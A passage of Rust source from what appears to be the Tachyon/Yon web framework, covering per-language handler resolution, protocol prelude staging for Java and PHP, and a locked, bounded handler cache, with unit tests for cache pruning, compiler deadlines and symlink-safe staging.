/// nothing.
fn has_own_entry_point(bytes: &[u8]) -> bool {
    String::from_utf8_lossy(bytes)
        .lines()
        .any(|line| line.trim_start().starts_with("fn main"))
}

/// The protocol runtime appended after a handler, so the file the author wrote
/// is a type and its methods rather than a `main` that parses standard input.
///
/// This is a per-language runtime, which the direct protocol deliberately had
/// none of — it ran any language, so it could assume nothing about any of
/// them. Yon runs eight now, and eight is few enough to give each the shape
/// the adapters already gave JavaScript and Python.
fn protocol_prelude(extension: &str, contents: &str) -> String {
    let template = match extension {
        "rs" => include_str!("preludes/yon.rs"),
        "java" => include_str!("preludes/yon.java"),
        "cs" => include_str!("preludes/yon.cs"),
        "php" => include_str!("preludes/yon.php"),
        "kt" => include_str!("preludes/yon.kt"),
        _ => return String::new(),
    };
    // The class carrying `@Controller`, not a class called `Handler`. A name is
    // a convention every language has to be told; the annotation is what the
    // author already wrote to say what the class is.
    let controller = crate::stereotype::declared_class(
        Path::new("x").with_extension(extension).as_path(),
        contents,
    )
    .map_or_else(
        || String::from("__YON_MISSING_STEREOTYPE__"),
        |(_, name)| name,
    );
    template.replace("__YON_CONTROLLER__", &controller)
}

/// What a language needs *before* the handler, as opposed to after it.
fn stereotype_prelude(extension: &str) -> &'static str {
    match extension {
        // Rust's stereotypes are procedural macros, so what goes before the
        // handler is the `use` that brings them into scope; the crate they come
        // from is built by `stereotype_crate` and linked with `--extern`.
        "rs" => {
            "#![allow(non_snake_case, dead_code)]\n#[allow(unused_imports)]\n\
             use tachyon_stereotypes::{Client, Controller, Delegate, Relay, Repository, Service};\n"
        }
        // Kotlin and Java declare their annotations in the protocol prelude
        // appended after the handler, so nothing is prepended before it.
        // Declaring them in both places is a redeclaration error, which is how
        // this was found.
        _ => "",
    }
}

/// Returns the byte offset after Java package/import declarations and trivia.
///
/// Source-file launch mode executes the first top-level class. Tachyon's
/// launcher therefore has to precede authored types, while package and import
/// declarations must remain at the beginning of the compilation unit.
fn java_preamble_end(source: &str) -> usize {
    let bytes = source.as_bytes();
    let mut at = 0;
    loop {
        loop {
            while bytes.get(at).is_some_and(u8::is_ascii_whitespace) {
                at += 1;
            }
            if bytes.get(at..at + 2) == Some(b"//") {
                at += 2;
                while bytes.get(at).is_some_and(|byte| *byte != b'\n') {
                    at += 1;
                }
                continue;
            }
            if bytes.get(at..at + 2) == Some(b"/*") {
                at += 2;
                while at < bytes.len() && bytes.get(at..at + 2) != Some(b"*/") {
                    at += 1;
                }
                at = (at + 2).min(bytes.len());
                continue;
            }
            break;
        }

        let declaration = [b"package".as_slice(), b"import".as_slice()]
            .into_iter()
            .find(|keyword| {
                bytes.get(at..at + keyword.len()) == Some(*keyword)
                    && bytes
                        .get(at + keyword.len())
                        .is_some_and(u8::is_ascii_whitespace)
            });
        if declaration.is_none() {
            return at;
        }
        while bytes.get(at).is_some_and(|byte| *byte != b';') {
            at += 1;
        }
        if at == bytes.len() {
            return at;
        }
        at += 1;
    }
}

fn java_runtime_source(contents: &str, protocol: &str) -> String {
    let preamble_end = java_preamble_end(contents);
    let mut combined = String::with_capacity(contents.len() + protocol.len() + 2);
    combined.push_str(&contents[..preamble_end]);
    if !combined.is_empty() && !combined.ends_with('\n') {
        combined.push('\n');
    }
    combined.push_str(protocol);
    if !combined.ends_with('\n') {
        combined.push('\n');
    }
    combined.push_str(&contents[preamble_end..]);
    combined
}

/// Stages a Java handler with Tachyon's source-file launcher before its types.
///
/// Cached on the complete staged source, so an unchanged handler is staged
/// once and a protocol change cannot reuse an obsolete runtime.
fn stage_with_prelude(
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
    extension: &str,
) -> Result<PreparedCommand, Failure> {
    let contents =
        materialize_compiled_relays(extension, &String::from_utf8_lossy(bytes), portable)?;
    let protocol = protocol_prelude(extension, &contents);
    let combined = java_runtime_source(&contents, &protocol);
    let digest = crate::compiler::hex_digest(Sha256::digest(combined.as_bytes()));
    // The digest goes in the directory so the staged source keeps a stable,
    // human-readable name for diagnostics.
    let cache_directory = PathBuf::from(&digest);
    let staged = cache_directory.join(format!("Yon.{extension}"));
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime = workspace.path().join(format!("Yon.{extension}"));
    stage_and_copy(
        cache,
        &staged,
        combined.as_bytes(),
        &runtime,
        &digest,
        portable,
    )?;
    Ok(PreparedCommand {
        interpreter: vec![String::from("java"), runtime.to_string_lossy().into_owned()],
        workspace,
    })
}

/// Stages the PHP protocol runtime and returns its path.
///
/// Tachyon's own, not the project's: a handler should not have to ship the
/// half of the protocol Tachyon owns, and `server/lib/tachyon.php` was that
/// half living in every project that wrote a PHP handler.
fn php_cli_path(path: &Path) -> String {
    #[cfg(windows)]
    {
        // PHP parses `-d` values as INI syntax. Forward slashes preserve an
        // absolute Windows path without treating its backslashes as escapes.
        path.to_string_lossy().replace('\\', "/")
    }
    #[cfg(not(windows))]
    {
        path.to_string_lossy().into_owned()
    }
}

fn prepare_php(
    cache: &CacheDirectory,
    portable: &str,
    bytes: &[u8],
) -> Result<PreparedCommand, Failure> {
    // Templated, so the digest is per-controller rather than per-runtime: the
    // dispatch names the class that carried `#[Controller]`.
    let contents = std::str::from_utf8(bytes)
        .map_err(|_| invalid_source(portable, "Handler source must be valid UTF-8."))?;
    let runtime = protocol_prelude("php", contents);
    let materialized = materialize_compiled_relays("php", contents, portable)?;
    let runtime_digest = crate::compiler::hex_digest(Sha256::digest(runtime.as_bytes()));
    let handler_digest = crate::compiler::hex_digest(Sha256::digest(materialized.as_bytes()));
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime_cache = PathBuf::from(format!("yon-runtime-{runtime_digest}.php"));
    let handler_cache = PathBuf::from(format!("yon-handler-{handler_digest}.php"));
    let runtime_copy = workspace.path().join("yon-runtime.php");
    let handler_copy = workspace.path().join("yon-handler.php");
    stage_and_copy(
        cache,
        &runtime_cache,
        runtime.as_bytes(),
        &runtime_copy,
        &format!("yon-runtime-{runtime_digest}"),
        portable,
    )?;
    stage_and_copy(
        cache,
        &handler_cache,
        materialized.as_bytes(),
        &handler_copy,
        &format!("yon-handler-{handler_digest}"),
        portable,
    )?;
    Ok(PreparedCommand {
        interpreter: vec![
            String::from("php"),
            String::from("-d"),
            format!("auto_append_file={}", php_cli_path(&runtime_copy)),
            String::from("-f"),
            php_cli_path(&handler_copy),
        ],
        workspace,
    })
}

fn ensure_cache_directory(
    cache: &CacheDirectory,
    relative: &Path,
    portable: &str,
) -> Result<(), Failure> {
    match cache.create_directory(relative) {
        Ok(()) => Ok(()),
        Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
            let metadata = cache.metadata(relative).map_err(|inspect| {
                cache_failure(portable, "Cannot inspect cached directory", inspect)
            })?;
            if metadata.is_dir() && !metadata.is_symlink() {
                Ok(())
            } else {
                Err(invalid_source(
                    portable,
                    "A handler cache directory is a symlink or unsupported type.",
                ))
            }
        }
        Err(error) => Err(cache_failure(
            portable,
            "Cannot create cache directory",
            error,
        )),
    }
}

fn stage_and_copy(
    cache: &CacheDirectory,
    cache_path: &Path,
    bytes: &[u8],
    runtime_path: &Path,
    lock_prefix: &str,
    portable: &str,
) -> Result<(), Failure> {
    let prune = cache
        .acquire_lock(Path::new(".prune.lock"), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))?;
    let content = cache
        .acquire_lock(Path::new(&format!("{lock_prefix}.lock")), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cached staging", error))?;
    cache.prune().map_err(|error| {
        cache_failure(portable, "Cannot enforce the handler cache bounds", error)
    })?;
    if let Some(parent) = cache_path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        ensure_cache_directory(cache, parent, portable)?;
    }
    cache
        .stage_bytes(cache_path, bytes)
        .map_err(|error| cache_failure(portable, "Cannot publish cached stage", error))?;
    drop(content);
    cache.prune().map_err(|error| {
        cache_failure(portable, "Cannot enforce the handler cache bounds", error)
    })?;
    let content = cache
        .acquire_lock(Path::new(&format!("{lock_prefix}.lock")), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cached staging", error))?;
    if cache.read(cache_path).ok().as_deref() != Some(bytes) {
        return Err(invalid_source(
            portable,
            "The cached stage cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }
    cache
        .copy_file_out(cache_path, runtime_path)
        .map_err(|error| cache_failure(portable, "Cannot copy cached runtime stage", error))?;
    drop(content);
    drop(prune);
    Ok(())
}

/// Resolves the adapter for one handler file name.
///
/// JavaScript and Python have built-in adapters. The other supported Yon
/// languages use Tachyon-owned direct-protocol runtimes or compiled artifacts.
/// Other languages are reached through an explicit `@Relay` boundary.
/// Returns whether a project-relative path is the root middleware source.
fn is_middleware(source: &Path) -> bool {
    source
        .parent()
        .is_none_or(|parent| parent.as_os_str().is_empty())
        && source
            .file_name()
            .and_then(|name| name.to_str())
            .is_some_and(|name| name.starts_with("middleware."))
}

fn language(
    source: &Path,
    bytes: &[u8],
    portable: &str,
    project: &Dir,
) -> Result<LanguageResolution, Failure> {
    let name = source.file_name().and_then(|name| name.to_str());
    match name {
        Some("yon.js" | "middleware.js") => {
            return Ok((HandlerLanguage::JavaScript, Vec::new(), false, None));
        }
        Some("yon.py" | "middleware.py") => {
            return Ok((HandlerLanguage::Python, Vec::new(), false, None));
        }
        _ => {}
    }
    // Any other source is served by the direct protocol, keyed on its file
    // extension. That covers yon.<ext> routes, middleware.<ext>, and a worker
    // under server/workers with any name at all.
    let extension = name
        .and_then(|name| name.rsplit_once('.').map(|(_, extension)| extension))
        .filter(|extension| {
            !extension.is_empty() && extension.bytes().all(|byte| byte.is_ascii_alphanumeric())
        });
    let Some(extension) = extension else {
        return Err(no_adapter(portable, "has no file extension to resolve"));
    };

    // Yon runs eight languages and knows how to start each of them, so a
    // handler says nothing about how it is run. A shebang was the right answer
    // while Yon ran any language — Tachyon could not have a table of every
    // interpreter in the world — but a bounded set is a table, and one that
    // Tachyon owns rather than every handler repeating.
    if !crate::stereotype::ANNOTATED_LANGUAGES
        .iter()
        .any(|supported| supported.eq_ignore_ascii_case(extension))
    {
        return Err(unsupported_language(portable, extension));
    }
    if extension.eq_ignore_ascii_case("js") {
        return Ok((HandlerLanguage::JavaScript, Vec::new(), false, None));
    }
    if extension.eq_ignore_ascii_case("py") {
        return Ok((HandlerLanguage::Python, Vec::new(), false, None));
    }
    // TypeScript runs on a runtime that reads it: Bun and Deno both do, and
    // `--javascript-runtime` selects which. Node cannot, which is the same
    // reason a `yon.js` needs one of the two to carry a decorator.
    if extension.eq_ignore_ascii_case("ts") {
        return Ok((HandlerLanguage::TypeScript, Vec::new(), false, None));
    }
    // PHP is started with the protocol runtime appended after the handler,
    // because PHP strips a shebang only from an entry script and the handler is
    // the entry script.
    if extension.eq_ignore_ascii_case("php") {
        // Middleware answers `before` and `after` rather than an HTTP method,
        // so the handler runtime would dispatch nothing and then write a 405
        // after whatever the middleware had already written. It speaks the
        // protocol itself, as it did before handlers stopped having to.
        if is_middleware(source) {
            return Ok((
                HandlerLanguage::Direct,
                vec![String::from("php")],
                false,
                None,
            ));
        }
        let cache = handler_cache(project, portable)?;
        let prepared = prepare_php(&cache, portable, bytes)?;
        return Ok((
            HandlerLanguage::Direct,
            prepared.interpreter,
            true,
            Some(prepared.workspace),
        ));
    }
    // A `yon.java` with no shebang still runs: JEP 330's single-file source
    // mode is what starts it. With a shebang it takes the path above like
    // every other language.
    if extension.eq_ignore_ascii_case("java") {
        // JEP 330 launches a single source file, so the protocol is appended to
        // a staged copy of it — the same way a compiled handler gets one.
        let cache = handler_cache(project, portable)?;
        let prepared = stage_with_prelude(bytes, portable, &cache, "java")?;
        return Ok((
            HandlerLanguage::Direct,
            prepared.interpreter,
            true,
            Some(prepared.workspace),
        ));
    }
    if extension.eq_ignore_ascii_case("cs") {
        let cache = handler_cache(project, portable)?;
        return compile_csharp(bytes, portable, &cache).map(|prepared| {
            (
                HandlerLanguage::Direct,
                prepared.interpreter,
                true,
                Some(prepared.workspace),
            )
        });
    }
    if let Some(compiler) = built_in_compiler(extension) {
        let cache = handler_cache(project, portable)?;
        return compile_handler(compiler, source, bytes, portable, &cache).map(|prepared| {
            (
                HandlerLanguage::Direct,
                prepared.interpreter,
                true,
                Some(prepared.workspace),
            )
        });
    }
    // A supported extension always reaches one of the arms above, so this is
    // unreachable rather than a fallback. The executable bit used to be the
    // last one — run whatever the file is — and it went with the languages it
    // was there to admit.
    Err(unsupported_language(portable, extension))
}

/// The language a handler is written in is not one Yon runs.
fn unsupported_language(portable: &str, extension: &str) -> Failure {
    Failure::one(diagnostic(
        2003,
        format!("Handler source '{portable}' is written in a language Yon does not run."),
        Some(format!(
            "Yon runs {known}. A handler declares its layer with @Controller, @Service or \
             @Repository, so a language whose syntax cannot carry an annotation cannot be a \
             handler — which is why '.{extension}' is not here. Reach it through a delegate \
             instead: a @Delegate spawns any program that speaks Handler Protocol v1.",
            known = known_extensions()
        )),
        None,
    ))
}

/// Lists what the diagnostic can promise works, so the help is never stale.
///
/// Read from `ANNOTATED_LANGUAGES` rather than restated, because that list is
/// what `language()` gates on: a message naming a different set from the one
/// the resolver uses is the failure this function exists to prevent, and it
/// had it once already — `yon.ts` was advertised here and handled nowhere.
fn known_extensions() -> String {
    crate::stereotype::ANNOTATED_LANGUAGES
        .iter()
        .map(|extension| format!("yon.{extension}"))
        .collect::<Vec<_>>()
        .join(", ")
}

fn no_adapter(portable: &str, reason: &str) -> Failure {
    Failure::one(diagnostic(
        2003,
        format!("Handler source '{portable}' {reason}."),
        Some(format!(
            "Use one of the framework-owned route names: {known}. Reach a program in any \
             other language from an @Delegate method carrying @Relay.",
            known = known_extensions(),
        )),
        source_span(portable, 0, portable.len()),
    ))
}

fn invalid_source(path: &str, message: &str) -> Failure {
    Failure::one(diagnostic(
        2004,
        format!("{message} Source: '{path}'."),
        Some(String::from(
            "Use a regular, UTF-8, project-contained source no larger than 1 MiB.",
        )),
        source_span(path, 0, path.len()),
    ))
}

fn source_io<T>(result: std::io::Result<T>, path: &str) -> Result<T, Failure> {
    result.map_err(|error| {
        Failure::one(diagnostic(
            2001,
            format!("Cannot inspect handler source '{path}': {error}"),
            None,
            source_span(path, 0, path.len()),
        ))
    })
}

fn portable(path: &Path) -> String {
    path.components()
        .filter_map(|component| match component {
            Component::Normal(value) => value.to_str(),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("/")
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used)]

    use super::super::cache::{CacheDirectory, CacheLock, OwnedCacheEntry};
    use super::{
        HandlerLanguage, HandlerSource, bounded_compiler_output_with_limits, compiled_digest,
        csharp_digest, java_runtime_source, materialize_compiled_relays, valid_csharp_cache,
        validate_relay_placement,
    };
    #[cfg(unix)]
    use super::{RUST_STEREOTYPE_CRATE, stereotype_crate};
    #[cfg(unix)]
    use sha2::{Digest as _, Sha256};
    use std::fs;
    use std::path::Path;
    use std::time::Duration;

    struct TemporaryCachePath {
        guard: OwnedCacheEntry,
    }

    impl TemporaryCachePath {
        fn file(path: &Path) -> Self {
            let (cache, relative) = cache_child(path);
            Self {
                guard: cache.adopt_file(&relative).expect("adopt file"),
            }
        }

        fn directory(path: &Path) -> Self {
            let (cache, relative) = cache_child(path);
            Self {
                guard: cache.adopt_directory(&relative).expect("adopt directory"),
            }
        }
    }

    impl Drop for TemporaryCachePath {
        fn drop(&mut self) {
            let _ = &self.guard;
        }
    }

    fn cache_child(path: &Path) -> (CacheDirectory, std::path::PathBuf) {
        let parent = path.parent().expect("cache parent");
        let relative = std::path::PathBuf::from(path.file_name().expect("cache child"));
        (
            CacheDirectory::open_test_root(parent).expect("cache capability"),
            relative,
        )
    }

    #[test]
    fn java_runtime_keeps_declarations_first_and_launcher_before_authored_types() {
        let authored = "/* license */\npackage example;\nimport java.util.Map;\n\nclass Helper {}\n@Controller\nclass OrdersController {}\n";
        let protocol = "final class YonLauncher { public static void main(String[] args) {} }\n";
        let staged = java_runtime_source(authored, protocol);

        let package = staged.find("package example;").expect("package");
        let import = staged.find("import java.util.Map;").expect("import");
        let launcher = staged.find("final class YonLauncher").expect("launcher");
        let helper = staged.find("class Helper").expect("authored helper");
        assert!(package < import && import < launcher && launcher < helper);
    }

    fn acquire_cache_lock(path: &Path, portable: &str) -> Result<CacheLock, crate::Failure> {
        acquire_cache_lock_with_wait(path, portable, Duration::from_mins(1))
    }

    fn acquire_cache_lock_with_wait(
        path: &Path,
        portable: &str,
        wait: Duration,
    ) -> Result<CacheLock, crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.acquire_lock(&relative, wait).map_err(|error| {
            super::invalid_source(
                portable,
                &format!("Cannot coordinate the handler build cache: {error}"),
            )
        })
    }

    fn acquire_cache_lock_with_initializer<F>(
        path: &Path,
        portable: &str,
        wait: Duration,
        initialize: F,
    ) -> Result<CacheLock, crate::Failure>
    where
        F: Fn(&mut cap_std::fs::File, u32, u64, &str) -> std::io::Result<()>,
    {
        let (cache, relative) = cache_child(path);
        cache
            .acquire_lock_with(&relative, wait, initialize)
            .map_err(|error| {
                super::invalid_source(
                    portable,
                    &format!("Cannot coordinate the handler build cache: {error}"),
                )
            })
    }

    fn prune_handler_cache_with_limits(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
    ) -> std::io::Result<()> {
        CacheDirectory::open_test_root(directory)?.prune_with_limits(max_entries, max_bytes)
    }

    fn prune_handler_cache_with_remover<F>(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
        remove: F,
    ) -> std::io::Result<()>
    where
        F: Fn(&Path) -> std::io::Result<()>,
    {
        prune_handler_cache_with_operations(directory, max_entries, max_bytes, remove, path_usage)
    }

    fn prune_handler_cache_with_operations<F, M>(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
        remove: F,
        measure: M,
    ) -> std::io::Result<()>
    where
        F: Fn(&Path) -> std::io::Result<()>,
        M: Fn(&Path) -> std::io::Result<(usize, u64)>,
    {
        let cache = CacheDirectory::open_test_root(directory)?;
        cache.prune_with(
            max_entries,
            max_bytes,
            |_cache, relative| remove(&directory.join(relative)),
            |_cache, relative| measure(&directory.join(relative)),
        )
    }

    fn path_usage(path: &Path) -> std::io::Result<(usize, u64)> {
        let (cache, relative) = cache_child(path);
        cache.path_usage(&relative)
    }

    fn reserve_attempt_directory(
        path: &Path,
        portable: &str,
        purpose: &str,
    ) -> Result<OwnedCacheEntry, crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.create_owned_directory(&relative).map_err(|error| {
            super::invalid_source(
                portable,
                &format!("Cannot reserve {purpose} attempt directory: {error}"),
            )
        })
    }

    fn write_owned_file(path: &Path, bytes: &[u8], portable: &str) -> Result<(), crate::Failure> {
        let (cache, relative) = cache_child(path);
        let mut guard = cache
            .write_owned_for_test(&relative, bytes)
            .map_err(|error| {
                super::invalid_source(
                    portable,
                    &format!("Cannot create owned cache file: {error}"),
                )
            })?;
        guard.publish();
        Ok(())
    }

    fn stage_cached_bytes(path: &Path, bytes: &[u8], portable: &str) -> Result<(), crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.stage_bytes(&relative, bytes).map_err(|error| {
            super::invalid_source(portable, &format!("Cannot publish cache stage: {error}"))
        })
    }

    #[test]
    fn compiler_execution_has_strict_deadline_and_output_caps() {
        let timeout = bounded_compiler_output_with_limits(
            "sh",
            &[String::from("-c"), String::from("sleep 2")],
            None,
            Duration::from_millis(25),
            64,
        )
        .expect_err("compiler deadline");
        assert!(timeout.contains("25 millisecond"), "{timeout}");

        let output = bounded_compiler_output_with_limits(
            "sh",
            &[
                String::from("-c"),
                String::from("printf '%0200d' 0; printf '%0200d' 0 >&2"),
            ],
            None,
            Duration::from_secs(2),
            64,
        )
        .expect("bounded output");
        assert!(output.overflow);
        assert_eq!(output.stdout.len(), 64);
        assert_eq!(output.stderr.len(), 64);
    }

    #[cfg(unix)]
    #[test]
    fn compiler_deadline_reaps_descendants_and_settles_inherited_pipes() {
        let root = tempfile::tempdir().expect("compiler probe");
        let pid_file = root.path().join("descendant.pid");
        let script = format!("sleep 60 & echo $! > '{}'; wait", pid_file.display());
        bounded_compiler_output_with_limits(
            "sh",
            &[String::from("-c"), script],
            None,
            Duration::from_millis(100),
            64,
        )
        .expect_err("compiler group deadline");
        let pid = fs::read_to_string(&pid_file).expect("descendant pid");
        for _ in 0..50 {
            if !std::process::Command::new("kill")
                .args(["-0", pid.trim()])
                .status()
                .is_ok_and(|status| status.success())
            {
                return;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        panic!("compiler descendant {pid} survived process-group timeout");
    }

    #[test]
    fn cache_pruning_is_deterministic_and_honors_entry_and_byte_limits() {
        let root = tempfile::tempdir().expect("cache");
        for (name, bytes) in [("a", 40), ("b", 40), ("c", 40)] {
            fs::write(root.path().join(name), vec![b'x'; bytes]).expect("entry");
            std::thread::sleep(Duration::from_millis(5));
        }
        fs::write(root.path().join("active.lock"), vec![b'x'; 1_000]).expect("lock");
        prune_handler_cache_with_limits(root.path(), 2, 70).expect("prune");
        assert!(!root.path().join("a").exists());
        assert!(!root.path().join("b").exists());
        assert!(root.path().join("c").exists());
        assert!(root.path().join("active.lock").exists());
    }

    #[test]
    fn cache_pruning_never_removes_an_active_digest_attempt() {
        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("active.lock"), b"").expect("active lock");
        fs::write(root.path().join("active.bin"), vec![b'a'; 80]).expect("active artifact");
        fs::write(root.path().join(".active.1.tmp"), vec![b'a'; 80]).expect("active temp");
        fs::write(root.path().join("active_1_tmp_yon.rs"), vec![b'a'; 80]).expect("active stage");
        fs::write(root.path().join("inactive.bin"), vec![b'i'; 80]).expect("inactive");
        prune_handler_cache_with_limits(root.path(), 0, 0).expect("prune inactive entries");
        assert!(root.path().join("active.bin").exists());
        assert!(root.path().join(".active.1.tmp").exists());
        assert!(root.path().join("active_1_tmp_yon.rs").exists());
        assert!(!root.path().join("inactive.bin").exists());
    }

    #[test]
    fn concurrent_active_build_survives_pressure_from_another_digest() {
        let root = tempfile::tempdir().expect("cache");
        let cache = root.path().to_path_buf();
        let registered = std::sync::Arc::new(std::sync::Barrier::new(2));
        let pruned = std::sync::Arc::new(std::sync::Barrier::new(2));
        std::thread::scope(|scope| {
            let registered_a = std::sync::Arc::clone(&registered);
            let pruned_a = std::sync::Arc::clone(&pruned);
            let cache_a = cache.clone();
            let build_a = scope.spawn(move || {
                let global = acquire_cache_lock(&cache_a.join(".prune.lock"), "a").expect("global");
                let _active = acquire_cache_lock(&cache_a.join("a.lock"), "a").expect("a lock");
                drop(global);
                fs::write(cache_a.join("a_tmp_yon.kt"), vec![b'a'; 80]).expect("a stage");
                registered_a.wait();
                std::thread::sleep(Duration::from_millis(50));
                assert!(cache_a.join("a_tmp_yon.kt").exists());
                fs::rename(cache_a.join("a_tmp_yon.kt"), cache_a.join("a.jar")).expect("publish a");
                pruned_a.wait();
            });
            let cache_b = cache.clone();
            let build_b = scope.spawn(move || {
                registered.wait();
                let global = acquire_cache_lock(&cache_b.join(".prune.lock"), "b").expect("global");
                let _active = acquire_cache_lock(&cache_b.join("b.lock"), "b").expect("b lock");
                prune_handler_cache_with_limits(&cache_b, 0, 0).expect("pressure prune");
                pruned.wait();
                drop(global);
                fs::write(cache_b.join("b.jar"), b"b").expect("publish b");
            });
            build_a.join().expect("build a");
            build_b.join().expect("build b");
        });
        assert!(cache.join("a.jar").exists());
        assert!(cache.join("b.jar").exists());
        prune_handler_cache_with_limits(&cache, 2, 160).expect("post-publish bound");
        let (entries, bytes) = path_usage(&cache).expect("bounded cache usage");
        assert!(entries <= 3, "cache root plus entries: {entries}");
        assert!(bytes <= 160, "cache bytes: {bytes}");
        assert!(
            fs::read_dir(&cache)
                .expect("cache")
                .flatten()
                .all(|entry| !entry.file_name().to_string_lossy().contains("tmp"))
        );
    }

    #[test]
    fn stale_locks_recover_but_live_owner_locks_are_never_stolen() {
        let root = tempfile::tempdir().expect("cache");
        let stale = root.path().join("stale.lock");
        fs::write(&stale, "4294967294 0 stale-token\n").expect("stale owner");
        let recovered = acquire_cache_lock_with_wait(&stale, "stale", Duration::from_millis(50))
            .expect("stale lock recovers");
        drop(recovered);

        let live = root.path().join("live.lock");
        fs::write(
            &live,
            format!(
                "{} {} live-token\n",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::SystemTime::UNIX_EPOCH)
                    .expect("wall clock")
                    .as_secs()
            ),
        )
        .expect("live owner");
        let failure = acquire_cache_lock_with_wait(&live, "live", Duration::from_millis(30))
            .expect_err("live lock must block");
        assert!(failure.to_string().contains("Timed out"), "{failure}");
        assert!(live.exists());
    }

    #[cfg(unix)]
    #[test]
    fn cache_root_symlinks_fail_closed_without_touching_external_sentinels() {
        use std::os::unix::fs::symlink;

        for link_handlers in [false, true] {
            let root = tempfile::tempdir().expect("project");
            let outside = tempfile::tempdir().expect("outside");
            fs::write(outside.path().join("sentinel"), "keep").expect("sentinel");
            if link_handlers {
                fs::create_dir(root.path().join(".tachyon")).expect("tachyon");
                symlink(outside.path(), root.path().join(".tachyon/handlers"))
                    .expect("handlers link");
            } else {
                symlink(outside.path(), root.path().join(".tachyon")).expect("tachyon link");
            }
            write(
                root.path(),
                "server/routes/yon.kt",
                b"@Controller\nobject OrdersController { @JvmStatic fun GET(request: YonRequest): YonResponse = YonResponse.json(\"{}\") }",
            );
            let failure = HandlerSource::discover(root.path(), "server/routes/yon.kt")
                .expect_err("cache symlink");
            assert!(failure.to_string().contains("non-symlinked"), "{failure}");
            assert_eq!(
                fs::read_to_string(outside.path().join("sentinel")).expect("sentinel"),
                "keep"
            );
            assert_eq!(fs::read_dir(outside.path()).expect("outside").count(), 1);
        }
    }

    #[cfg(unix)]
    #[test]
    fn cache_child_symlinks_never_reach_external_sentinels() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
        fs::write(&sentinel, "keep").expect("sentinel");
        for name in [
            "Yon.java",
            "yon-runtime.php",
            "yon-handler.php",
            "generic-stage.rs",
        ] {
            let child = root.path().join(name);
            symlink(&sentinel, &child).expect("child link");
            let failure = stage_cached_bytes(&child, b"replacement", name).expect_err("symlink");
            assert!(failure.to_string().contains("symlink"), "{failure}");
            fs::remove_file(child).expect("remove link");
        }

        let digest = crate::compiler::hex_digest(Sha256::digest(RUST_STEREOTYPE_CRATE.as_bytes()));
        let stereotype_library = root.path().join(format!(
            "{}tachyon_stereotypes-{digest}{}",
            std::env::consts::DLL_PREFIX,
            std::env::consts::DLL_SUFFIX
        ));
        symlink(&sentinel, &stereotype_library).expect("stereotype library link");
        let compiler = tempfile::tempdir().expect("compiler workspace");
        let cache = CacheDirectory::open_test_root(root.path()).expect("cache capability");
        let failure =
            stereotype_crate(&cache, compiler.path(), "stereotype").expect_err("library symlink");
        assert!(
            failure.to_string().contains("valid regular file"),
            "{failure}"
        );
        assert_eq!(fs::read_to_string(&sentinel).expect("sentinel"), "keep");
    }

    #[test]
    fn owned_cache_file_collisions_are_never_cleaned_up() {
        let root = tempfile::tempdir().expect("cache");

        // Generic staged compiler sources and stage_cached_bytes temporaries
        // both use this create-new primitive. Existing files and directories
        // remain owned by their creator when reservation fails.
        let file = root.path().join("generic-stage.tmp");
        fs::write(&file, b"original").expect("file sentinel");
        write_owned_file(&file, b"replacement", "generic stage").expect_err("file collision");
        assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

        let directory = root.path().join("cached-bytes.tmp");
        fs::create_dir(&directory).expect("directory sentinel");
        fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
        write_owned_file(&directory, b"replacement", "cached bytes")
            .expect_err("directory collision");
        assert_eq!(
            fs::read(directory.join("sentinel")).expect("nested sentinel"),
            b"original"
        );
    }

    #[cfg(unix)]
    #[test]
    fn owned_cache_file_symlink_collision_is_never_cleaned_up() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
        fs::write(&sentinel, b"original").expect("sentinel");
        let link = root.path().join("generic-stage.tmp");
        symlink(&sentinel, &link).expect("link");

        write_owned_file(&link, b"replacement", "generic stage").expect_err("symlink collision");
        assert!(
            fs::symlink_metadata(&link)
                .expect("link remains")
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read(&sentinel).expect("sentinel"), b"original");
    }

    #[test]
    fn compiler_attempt_collisions_are_never_cleaned_up() {
        let root = tempfile::tempdir().expect("cache");

        // Generic, stereotype, and C# compilers share this exact reservation
        // primitive, so all compiler output is placed beneath a directory
        // known to have been created by the current attempt.
        for purpose in ["compiler", "stereotype compiler", "C# compiler"] {
            let file = root.path().join(format!("{purpose}-file"));
            fs::write(&file, b"original").expect("file sentinel");
            assert!(
                reserve_attempt_directory(&file, purpose, purpose).is_err(),
                "file collision must fail"
            );
            assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

            let directory = root.path().join(format!("{purpose}-directory"));
            fs::create_dir(&directory).expect("directory sentinel");
            fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
            assert!(
                reserve_attempt_directory(&directory, purpose, purpose).is_err(),
                "directory collision must fail"
            );
            assert_eq!(
                fs::read(directory.join("sentinel")).expect("nested sentinel"),
                b"original"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn compiler_attempt_symlink_collisions_are_never_cleaned_up() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
